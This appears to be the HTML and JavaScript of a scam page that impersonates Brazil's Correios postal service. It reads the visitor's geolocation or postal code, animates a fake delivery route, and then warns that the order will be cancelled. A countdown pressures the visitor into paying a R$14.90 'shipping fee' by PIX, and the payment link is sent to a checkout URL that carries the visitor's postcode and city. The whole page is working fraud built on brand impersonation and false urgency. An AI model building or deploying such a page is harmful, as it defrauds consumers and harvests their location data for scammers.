<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Correios • Frete Expresso</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mapbox/polyline@1.1.0/src/polyline.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>

        .leaflet-popup, .leaflet-tooltip, .leaflet-marker-icon .leaflet-popup, .leaflet-marker-icon .leaflet-tooltip {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
}
.leaflet-marker-icon {
    pointer-events: none !important;
}
[class*="leaflet-tooltip"], [class*="leaflet-popup"] {
    display: none !important;
}
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #f5f5f5;
            font-family: 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        /* --- REMOVER QUALQUER QUADRADO/TOOLTIP --- */
        .leaflet-popup,
        .leaflet-tooltip,
        .leaflet-marker-icon .leaflet-popup,
        .leaflet-marker-icon .leaflet-tooltip {
            display: none !important;
            visibility: hidden !important;
            pointer-events: none !important;
        }
        /* Força que os marcadores não tenham interação que gere popup */
        .leaflet-marker-icon {
            pointer-events: none !important;
        }
        /* Caso algum tooltip seja gerado dinamicamente */
        [class*="leaflet-tooltip"],
        [class*="leaflet-popup"] {
            display: none !important;
        }
        /* SPLASH BRANCA */
        .splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease;
        }
        .splash-screen img {
            width: 140px;
            height: auto;
            margin-bottom: 30px;
        }
        .splash-screen .loader {
            width: 60px;
            height: 60px;
            border: 6px solid #e0e0e0;
            border-top: 6px solid #003366;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-top: 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .splash-screen .splash-text {
            color: #003366;
            margin-top: 24px;
            font-size: 1rem;
            font-weight: 500;
            text-align: center;
            padding: 0 20px;
        }
        /* HEADER */
        .correios-header {
            background: linear-gradient(135deg, #003366 0%, #002244 100%);
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-bottom: 3px solid #ffcc00;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }
        .logo-area img {
            height: 60px;
            width: auto;
            filter: brightness(0) invert(1);
        }
        @media (max-width: 480px) {
            .correios-header { padding: 10px 16px; }
            .logo-area img { height: 48px; }
        }
        .cep-manual-area {
            background: #fff;
            padding: 12px 16px;
            border-bottom: 1px solid #ddd;
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        .cep-manual-area.hide { display: none; }
        .cep-manual-area .label {
            font-size: 0.7rem;
            font-weight: bold;
            color: #003366;
            text-transform: uppercase;
        }
        .cep-manual-area input {
            flex: 1;
            padding: 12px 16px;
            border: 1px solid #ccc;
            border-radius: 40px;
            font-size: 0.95rem;
            outline: none;
            color: #003366;
            font-weight: 500;
        }
        .cep-manual-area input:focus {
            border-color: #ffcc00;
            box-shadow: 0 0 0 2px rgba(255,204,0,0.3);
        }
        .cep-manual-area button {
            background: #003366;
            border: none;
            color: white;
            font-weight: bold;
            padding: 12px 20px;
            border-radius: 40px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            transition: 0.2s;
        }
        .cep-manual-area button:active { transform: scale(0.96); }
        .map-container {
            flex: 1;
            position: relative;
            background: #e9ecef;
        }
        #map {
            height: 100%;
            width: 100%;
            background: #cbd5e1;
        }
        .recalc-overlay {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: white;
            border-radius: 28px;
            padding: 20px;
            z-index: 1001;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            border: 1px solid #ffcc00;
            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
            text-align: center;
        }
        .recalc-overlay.hide { display: none; }
        .recalc-text {
            font-weight: bold;
            font-size: 1rem;
            color: #003366;
        }
        .recalc-sub {
            font-size: 0.75rem;
            color: #555;
        }
        .upsell-popup {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-radius: 28px 28px 0 0;
            box-shadow: 0 -8px 30px rgba(0,0,0,0.2);
            padding: 24px 20px 32px;
            z-index: 1050;
            transform: translateY(100%);
            transition: transform 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            border-top: 5px solid #ffcc00;
        }
        .upsell-popup.show { transform: translateY(0); }
        .badge-offer {
            background: #ffcc00;
            color: #003366;
            font-weight: 800;
            font-size: 0.7rem;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 14px;
            border-radius: 40px;
            margin-bottom: 16px;
        }
        .popup-title {
            font-size: 1.5rem;
            font-weight: 800;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
            color: #003366;
        }
        .popup-desc {
            color: #333;
            font-size: 0.9rem;
            margin-bottom: 16px;
            line-height: 1.4;
        }
        .countdown {
            background: #f0f2f5;
            padding: 10px;
            border-radius: 16px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            color: #d32f2f;
        }
        .price-line {
            display: flex;
            align-items: baseline;
            gap: 12px;
            margin-bottom: 20px;
            background: #f0f2f5;
            padding: 12px 16px;
            border-radius: 24px;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .price-original {
            text-decoration: line-through;
            color: #999;
            font-size: 0.9rem;
        }
        .price-new {
            font-size: 1.8rem;
            font-weight: 800;
            color: #00a650;
        }
        .btn-pix {
            background: #00a650;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 60px;
            font-weight: 700;
            font-size: 1rem;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-pix:active { transform: scale(0.97); }
        .close-upsell {
            position: absolute;
            top: 18px;
            right: 20px;
            background: #e9ecef;
            width: 32px;
            height: 32px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #003366;
        }
        .security-footer {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 16px;
            font-size: 0.65rem;
            color: #4a5568;
            flex-wrap: wrap;
        }
        .spinner-box {
            width: 48px;
            height: 48px;
            border: 4px solid #ffcc00;
            border-top: 4px solid #003366;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @media (max-width: 480px) {
            .popup-title { font-size: 1.3rem; }
            .price-new { font-size: 1.5rem; }
            .cep-manual-area button { padding: 10px 16px; font-size: 0.8rem; }
            .cep-manual-area input { padding: 10px 14px; font-size: 0.85rem; }
            .recalc-overlay { left: 16px; right: 16px; padding: 16px; }
        }
    </style>
</head>
<body>

    <div id="splash" class="splash-screen">
        <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
        <div class="loader"></div>
        <div class="splash-text" id="splashText">Abrindo sistema...</div>
    </div>

    <div class="correios-header">
        <div class="logo-area">
            <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
        </div>
    </div>

    <div id="cepManualArea" class="cep-manual-area hide">
        <div class="label"><i class="fas fa-search"></i> RASTREAR POR CEP</div>
        <input type="text" id="manualCep" placeholder="Digite seu CEP (ex: 01001000)" maxlength="9">
        <button id="btnManualCep"><i class="fas fa-route"></i> Calcular</button>
    </div>

    <div class="map-container">
        <div id="map"></div>
        <div id="recalcOverlay" class="recalc-overlay hide">
            <div class="spinner-box"></div>
            <div class="recalc-text"><i class="fas fa-sync-alt"></i> Recalculando frete...</div>
            <div class="recalc-sub">Analisando rota do seu endereço</div>
        </div>
    </div>

    <div id="upsellPopup" class="upsell-popup">
        <div class="close-upsell" id="closeUpsell"><i class="fas fa-times"></i></div>
        <div class="badge-offer"><i class="fas fa-bolt"></i> SEDEX PRIORITY</div>
        <div class="popup-title"><i class="fas fa-truck-fast"></i> Seu pedido será cancelado!</div>
        <div class="popup-desc" id="popupAddress">Carregando endereço...</div>
        <div class="countdown" id="countdownTimer"><i class="fas fa-hourglass-half"></i> Cancelamento em: 04:59</div>
        <div class="price-line">
            <span class="price-original">Valor real do frete: R$ 34,90</span>
            <span class="price-new">Você paga: R$ 14,90</span>
        </div>
        <button class="btn-pix" id="btnFinalizar"><i class="fab fa-pix"></i> PAGAR COM PIX</button>
        <div class="security-footer">
            <span><i class="fas fa-lock"></i> Pagamento seguro</span>
            <span><i class="fas fa-clock"></i> Cancelamento grátis</span>
            <span><i class="fas fa-headset"></i> Central de Atendimento</span>
        </div>
    </div>

    <script>
        (function() {
            const CD = { lat: -23.5475, lng: -46.6361 };
            let map = null;
            let currentRouteLayer = null, animatingLine = null;
            let lastCity = "";
            let lastUsedCEP = null;
            let countdownInterval = null;

            // Splash dinâmico
            const messages = [
                "Abrindo correios...",
                "Verificando malha logística...",
                "Calculando rotas...",
                "Recalculando frete...",
                "Quase lá...",
                "Conectando aos serviços"
            ];
            let idx = 0;
            const splashText = document.getElementById('splashText');
            const msgInterval = setInterval(() => {
                idx = (idx + 1) % messages.length;
                if (splashText) splashText.textContent = messages[idx];
            }, 1000);

            setTimeout(() => {
                clearInterval(msgInterval);
                const splash = document.getElementById('splash');
                if (splash) {
                    splash.style.opacity = '0';
                    setTimeout(() => splash.remove(), 600);
                }
                startLocationOrManual();
            }, 3500);

            function initMap() {
                if (map) return;
                map = L.map('map').setView([CD.lat, CD.lng], 9);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
                    attribution: '&copy; OSM & CartoDB',
                    subdomains: 'abcd'
                }).addTo(map);
                // Marcador CD - sem popup/tooltip
                const cdIcon = L.divIcon({
                    html: '<div style="background:#003366; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-warehouse" style="color:white; font-size:18px;"></i></div>',
                    iconSize: [38,38]
                });
                L.marker([CD.lat, CD.lng], { icon: cdIcon }).addTo(map);
            }

            function clearRoutes() {
                if (currentRouteLayer) map.removeLayer(currentRouteLayer);
                if (animatingLine) map.removeLayer(animatingLine);
                currentRouteLayer = null;
                animatingLine = null;
            }

            function decodePolyline(encoded) {
                return Polyline.decode(encoded, 6).map(p => L.latLng(p[0], p[1]));
            }

            async function animateRoute(points, duration = 2200) {
                return new Promise((resolve) => {
                    if (!points.length) { resolve(); return; }
                    clearRoutes();
                    if (points.length > 2) {
                        currentRouteLayer = L.polyline(points, { color: '#ffcc00', weight: 3, opacity: 0.5, interactive: false }).addTo(map);
                    }
                    animatingLine = L.polyline([], { color: '#003366', weight: 5, opacity: 0.9, lineJoin: 'round' }).addTo(map);
                    let step = 0, steps = points.length, start = performance.now();
                    function frame(now) {
                        let t = Math.min(1, (now - start) / duration);
                        let target = Math.floor(t * steps);
                        while (step <= target && step < steps) {
                            animatingLine.addLatLng(points[step]);
                            step++;
                        }
                        if (t < 1 && step < steps) requestAnimationFrame(frame);
                        else resolve();
                    }
                    requestAnimationFrame(frame);
                });
            }

            async function getAddressFromViaCEP(cep) {
                const clean = cep.replace(/\D/g, '');
                if (clean.length !== 8) throw new Error('CEP inválido');
                const resp = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
                const data = await resp.json();
                if (data.erro) throw new Error('CEP não encontrado');
                return { query: `${data.localidade}, ${data.uf}, Brasil`, cidade: data.localidade, uf: data.uf };
            }

            async function geocodeByCity(cityUfQuery) {
                const url = `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(cityUfQuery)}&format=json&limit=1&countrycodes=br&addressdetails=1`;
                const resp = await fetch(url, { headers: { 'User-Agent': 'FreteApp/1.0' } });
                const data = await resp.json();
                if (!data || data.length === 0) throw new Error('Geocode falhou');
                return { lat: parseFloat(data[0].lat), lng: parseFloat(data[0].lon) };
            }

            async function getRoadRoute(start, end) {
                try {
                    const url = `https://router.project-osrm.org/route/v1/driving/${start.lng},${start.lat};${end.lng},${end.lat}?overview=full&geometries=polyline`;
                    const resp = await fetch(url);
                    const data = await resp.json();
                    if (data.routes && data.routes.length) return decodePolyline(data.routes[0].geometry);
                    throw new Error();
                } catch(e) {
                    const steps = 40, points = [];
                    for (let i = 0; i <= steps; i++) {
                        const t = i / steps;
                        points.push(L.latLng(start.lat + (end.lat - start.lat) * t, start.lng + (end.lng - start.lng) * t));
                    }
                    return points;
                }
            }

            function showOverlay(show) {
                const ov = document.getElementById('recalcOverlay');
                show ? ov.classList.remove('hide') : ov.classList.add('hide');
            }

            function startCountdown(seconds = 300) {
                let remaining = seconds;
                const timer = document.getElementById('countdownTimer');
                if (countdownInterval) clearInterval(countdownInterval);
                countdownInterval = setInterval(() => {
                    if (remaining <= 0) {
                        clearInterval(countdownInterval);
                        timer.innerHTML = '<i class="fas fa-ban"></i> Pedido cancelado! Recarregue a página.';
                        document.getElementById('btnFinalizar').disabled = true;
                        document.getElementById('btnFinalizar').style.opacity = '0.5';
                    } else {
                        const mins = Math.floor(remaining / 60);
                        const secs = remaining % 60;
                        timer.innerHTML = `<i class="fas fa-hourglass-half"></i> Cancelamento em: ${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
                        remaining--;
                    }
                }, 1000);
            }
            function stopCountdown() { if (countdownInterval) clearInterval(countdownInterval); }

            function showUpsell(cidade) {
                document.getElementById('popupAddress').innerHTML = `<i class="fas fa-location-dot"></i> De acordo com a rota calculada, o frete grátis não se aplica à sua região (<strong>${cidade}</strong>). Para evitar o cancelamento do pedido, confirme o pagamento do frete abaixo.`;
                document.getElementById('upsellPopup').classList.add('show');
                startCountdown(300);
            }
            function hideUpsell() {
                document.getElementById('upsellPopup').classList.remove('show');
                stopCountdown();
            }

            async function trackWithCoords(lat, lng, cityName = null) {
                hideUpsell();
                showOverlay(true);
                try {
                    const destCoords = { lat, lng };
                    let cidade = cityName;
                    if (!cidade) {
                        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=10&addressdetails=1`;
                        const resp = await fetch(url, { headers: { 'User-Agent': 'FreteApp/1.0' } });
                        const data = await resp.json();
                        cidade = data.address?.city || data.address?.town || data.address?.village || "sua região";
                    }
                    lastCity = cidade;
                    const routePoints = await getRoadRoute(CD, destCoords);
                    const bounds = L.latLngBounds([CD, destCoords]);
                    map.fitBounds(bounds, { padding: [60, 60] });
                    const destIcon = L.divIcon({
                        html: '<div style="background:#00a650; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white; font-size:18px;"></i></div>',
                        iconSize: [38,38]
                    });
                    if (window.destMarker) map.removeLayer(window.destMarker);
                    window.destMarker = L.marker([destCoords.lat, destCoords.lng], { icon: destIcon }).addTo(map);
                    await animateRoute(routePoints, 2200);
                    showOverlay(false);
                    showUpsell(cidade);
                } catch (err) {
                    console.error(err);
                    showOverlay(false);
                    alert("Erro ao calcular rota. Tente novamente ou digite o CEP manualmente.");
                }
            }

            async function trackWithCEP(cep) {
                hideUpsell();
                if (!cep) return;
                showOverlay(true);
                try {
                    const { query, cidade } = await getAddressFromViaCEP(cep);
                    lastCity = cidade;
                    const coords = await geocodeByCity(query);
                    const routePoints = await getRoadRoute(CD, coords);
                    const bounds = L.latLngBounds([CD, coords]);
                    map.fitBounds(bounds, { padding: [60, 60] });
                    const destIcon = L.divIcon({
                        html: '<div style="background:#00a650; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white; font-size:18px;"></i></div>',
                        iconSize: [38,38]
                    });
                    if (window.destMarker) map.removeLayer(window.destMarker);
                    window.destMarker = L.marker([coords.lat, coords.lng], { icon: destIcon }).addTo(map);
                    await animateRoute(routePoints, 2200);
                    showOverlay(false);
                    showUpsell(cidade);
                    lastUsedCEP = cep;
                } catch(err) {
                    console.error(err);
                    showOverlay(false);
                    alert("Erro ao calcular rota. Verifique o CEP e tente novamente.");
                }
            }

            function tryGeolocation() {
                if (!navigator.geolocation) {
                    document.getElementById('cepManualArea').classList.remove('hide');
                    return;
                }
                showOverlay(true);
                navigator.geolocation.getCurrentPosition(async (position) => {
                    document.getElementById('cepManualArea').classList.add('hide');
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    await trackWithCoords(lat, lng, null);
                }, (error) => {
                    console.warn(error);
                    showOverlay(false);
                    document.getElementById('cepManualArea').classList.remove('hide');
                }, { enableHighAccuracy: true, timeout: 10000 });
            }

            function startLocationOrManual() {
                initMap();
                tryGeolocation();
            }

            document.getElementById('btnManualCep').addEventListener('click', () => {
                const cep = document.getElementById('manualCep').value.trim();
                if (cep) trackWithCEP(cep);
                else alert("Digite um CEP válido");
            });

            function redirectToPix() {
                const cep = lastUsedCEP || "desconhecido";
                const url = `https://checkout.exemplo.com/pix?order_id=${Date.now()}&upsell=frete_priority&value=14.90&origin=correios_mapa&cep=${cep}&cidade=${encodeURIComponent(lastCity)}`;
                window.location.href = url;
            }

            window.addEventListener('DOMContentLoaded', () => {
                document.getElementById('btnFinalizar').addEventListener('click', redirectToPix);
                document.getElementById('closeUpsell').addEventListener('click', hideUpsell);
            });
        })();
    </script>
</body>
</html>
